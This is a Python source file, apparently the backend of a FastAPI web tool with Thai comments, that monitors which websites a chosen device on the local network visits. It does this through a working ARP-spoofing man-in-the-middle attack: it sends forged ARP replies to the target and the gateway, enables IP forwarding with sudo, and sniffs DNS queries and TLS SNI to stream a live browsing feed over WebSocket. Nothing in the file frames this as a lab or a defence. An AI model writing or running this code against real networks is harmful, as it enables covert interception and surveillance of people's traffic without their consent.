import threading
import time
import logging
import platform
import subprocess
import re
import asyncio
from typing import Dict, List, Set
from fastapi import WebSocket, WebSocketDisconnect
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Ether, ARP, sendp, conf, Raw, get_if_hwaddr, srp

logger = logging.getLogger(__name__)

# ตัวแปรสำหรับเก็บ Main Event Loop ของ FastAPI
_main_loop = None

def set_main_loop(loop):
    global _main_loop
    _main_loop = loop

# --- [ WebSocket Connection Manager ] ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, List[WebSocket]] = {}

    async def connect(self, websocket: WebSocket, target_ip: str):
        await websocket.accept()
        if target_ip not in self.active_connections:
            self.active_connections[target_ip] = []
        self.active_connections[target_ip].append(websocket)

    def disconnect(self, websocket: WebSocket, target_ip: str):
        if target_ip in self.active_connections:
            if websocket in self.active_connections[target_ip]:
                self.active_connections[target_ip].remove(websocket)
            if not self.active_connections[target_ip]:
                del self.active_connections[target_ip]

    async def broadcast_to_ip(self, target_ip: str, message: dict):
        if target_ip in self.active_connections:
            # สร้างลิสต์สำรองเพื่อป้องกันการเปลี่ยนแปลงขณะวนลูป
            for connection in list(self.active_connections[target_ip]):
                try:
                    await connection.send_json(message)
                except Exception as e:
                    logger.debug(f"Broadcast error: {e}")

manager = ConnectionManager()
_active_monitors = {}
_lock = threading.RLock()
_monitor_history = {}
_ip_to_host = {}

DOMAIN_MAPPINGS = {
    "nflx": "Netflix", "netflix": "Netflix",
    "googlevideo": "YouTube", "youtube": "YouTube",
    "fbcdn": "Facebook", "facebook": "Facebook", "fbsbx": "Facebook",
    "instagram": "Instagram", "cdninstagram": "Instagram",
    "google": "Google", "gstatic": "Google Services", "googleapis": "Google API",
    "apple": "Apple", "icloud": "iCloud", "mzstatic": "Apple Services",
    "akamai": "CDN (Akamai)", "cloudfront": "CDN (CloudFront)",
    "twimg": "Twitter", "tiktok": "TikTok", "byteoversea": "TikTok",
    "discord": "Discord", "snapchat": "Snapchat"
}

FORBIDDEN_KEYWORDS = [
    "adservices", "adsense", "analytics", "tagmanager", "doubleclick", "pixel", 
    "telemetry", "metrics", "clarity", "datadog", "hotjar", "tracker", 
    "sentry", "crashlytics", "beacon", "mpulse"
]

def normalize_domain(host):
    host = host.lower()
    for key, val in DOMAIN_MAPPINGS.items():
        if key in host: return val
    return host

def _is_real_website(host):
    host = host.lower()
    if any(kw in host for kw in FORBIDDEN_KEYWORDS): return False
    return "." in host

def _update_state(target_ip, host, proto):
    if not _is_real_website(host): return
    service_name = normalize_domain(host)
    
    with _lock:
        if target_ip not in _monitor_history: _monitor_history[target_ip] = {}
        now = time.time()
        score_gain = 5 if proto == "SNI" else (3 if proto == "DNS" else 1)
        
        is_significant_update = False
        if service_name not in _monitor_history[target_ip]:
            is_significant_update = True
            _monitor_history[target_ip][service_name] = {
                "host": service_name, "confidence": score_gain,
                "first_seen": now, "last_seen": now, "proto": proto,
                "sources": {proto}, "active_raw_host": host
            }
        else:
            state = _monitor_history[target_ip][service_name]
            if now - state["last_seen"] > 1.5:
                state["confidence"] = min(state["confidence"] + score_gain, 100)
                is_significant_update = True
            state["last_seen"] = now
            state["sources"].add(proto)
            state["active_raw_host"] = host
            if proto in ["SNI", "DNS"]: state["proto"] = proto

        if is_significant_update and _main_loop:
            # ส่งข้อมูลผ่าน Main Loop ของ FastAPI เสมอ
            try:
                history = get_history(target_ip)
                asyncio.run_coroutine_threadsafe(
                    manager.broadcast_to_ip(target_ip, {"type": "update", "data": history}), 
                    _main_loop
                )
            except Exception as e:
                logger.debug(f"Threadsafe broadcast error: {e}")

def _get_mapped_host(target_ip, remote_ip):
    with _lock:
        history = _ip_to_host.get(target_ip, {}).get(remote_ip, [])
        if not history: return None
        now = time.time()
        for host, ts in reversed(history):
            if now - ts < 300: return host
        return None

def _add_ip_mapping(target_ip, remote_ip, host):
    with _lock:
        if target_ip not in _ip_to_host: _ip_to_host[target_ip] = {}
        if remote_ip not in _ip_to_host[target_ip]: _ip_to_host[target_ip][remote_ip] = []
        history = _ip_to_host[target_ip][remote_ip]
        now = time.time()
        for i, (h, ts) in enumerate(history):
            if h == host:
                history[i] = (h, now)
                return
        history.append((host, now))
        if len(history) > 3: history.pop(0)

def extract_sni(payload):
    try:
        if len(payload) > 5 and payload[0] == 0x16:
            domains = re.findall(rb'(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,6}', payload)
            if domains:
                for d in domains:
                    decoded = d.decode().lower()
                    if "." in decoded and len(decoded) > 3: return decoded
    except: pass
    return None

def _process_packet(target_ip):
    def handler(pkt):
        if not pkt.haslayer(IP): return
        host = None
        proto = "DNS"
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            if pkt.haslayer(DNSQR):
                try: host = pkt[DNSQR].qname.decode().strip(".").lower()
                except: pass
        elif pkt.haslayer(Raw):
            load = pkt[Raw].load
            if (pkt.haslayer(TCP) and pkt[TCP].dport == 443) or (pkt.haslayer(UDP) and pkt[UDP].dport == 443):
                detected_host = extract_sni(load)
                if detected_host:
                    host = detected_host
                    proto = "SNI"
        remote_ip = pkt[IP].dst if pkt[IP].src == target_ip else pkt[IP].src
        if host:
            _add_ip_mapping(target_ip, remote_ip, host)
            _update_state(target_ip, host, proto)
        else:
            cached_host = _get_mapped_host(target_ip, remote_ip)
            if cached_host:
                _update_state(target_ip, cached_host, "ACTIVE")
    return handler

def _sniff_loop(target_ip, iface, stop_event):
    try:
        sniff(iface=iface, filter=f"host {target_ip} and (port 53 or port 443)", 
              prn=_process_packet(target_ip), stop_filter=lambda x: stop_event.is_set(), store=0)
    except Exception as e:
        logger.error(f"❌ Sniff Error: {e}")

def _poison_loop(target_ip, target_mac, gw_ip, gw_mac, stop_event):
    iface = conf.iface
    local_mac = get_if_hwaddr(iface)
    pkt_t = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip, hwsrc=local_mac)
    pkt_g = Ether(dst=gw_mac)/ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=local_mac)
    _set_forwarding(True)
    while not stop_event.is_set():
        sendp([pkt_t, pkt_g], iface=iface, verbose=False)
        stop_event.wait(1.5)

def _get_gateway_info():
    try:
        gw_ip = conf.route.route("0.0.0.0")[2]
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip), timeout=2, verbose=False)
        if ans: return gw_ip, ans[0][1].hwsrc
    except: pass
    return None, None

def _set_forwarding(enable=True):
    try:
        val = "1" if enable else "0"
        if platform.system() == "Darwin":
            subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=" + val], capture_output=True)
    except: pass

def start_monitor(target_ip, target_mac):
    with _lock:
        if target_ip in _active_monitors: return
        _monitor_history[target_ip] = {}
        _ip_to_host[target_ip] = {}
        gw_ip, gw_mac = _get_gateway_info()
        if not gw_ip: return
        stop_event = threading.Event()
        iface = conf.iface if conf.iface else "en0"
        s_thread = threading.Thread(target=_sniff_loop, args=(target_ip, iface, stop_event), daemon=True)
        p_thread = threading.Thread(target=_poison_loop, args=(target_ip, target_mac, gw_ip, gw_mac, stop_event), daemon=True)
        s_thread.start()
        p_thread.start()
        _active_monitors[target_ip] = {"stop_event": stop_event}

def stop_monitor(target_ip):
    with _lock:
        m = _active_monitors.pop(target_ip, None)
        if m: 
            m["stop_event"].set()
            _monitor_history.pop(target_ip, None)

def get_history(target_ip):
    with _lock:
        states = _monitor_history.get(target_ip, {})
        now = time.time()
        result = []
        for name, state in states.items():
            time_diff = now - state["last_seen"]
            if time_diff < 300:
                display_state = state.copy()
                display_state["sources"] = list(state["sources"])
                display_state["is_live"] = time_diff < 15
                result.append(display_state)
        result.sort(key=lambda x: (x["is_live"], x["confidence"], x["last_seen"]), reverse=True)
        return result[:10]
